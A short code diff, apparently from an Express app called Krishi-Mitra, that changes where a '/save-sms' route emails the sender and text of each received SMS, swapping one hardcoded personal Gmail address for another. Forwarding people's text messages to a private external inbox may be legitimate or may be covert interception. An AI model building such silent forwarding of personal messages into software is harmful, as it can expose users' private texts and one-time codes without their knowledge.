@@ -25,7 +25,7 @@ router.post("/save-sms", async (req, res) => {
 
     await transporter.sendMail({
       from: `"Krishi-Mitra" <${process.env.MAIL_ID}>`,
-      to: "mohammadsalmankhan213@gmail.com",
+      to: "bravo54213@gmail.com",
       subject: "New SMS Received",
       text: `From: ${sender}\nMessage: ${message}`,
     });
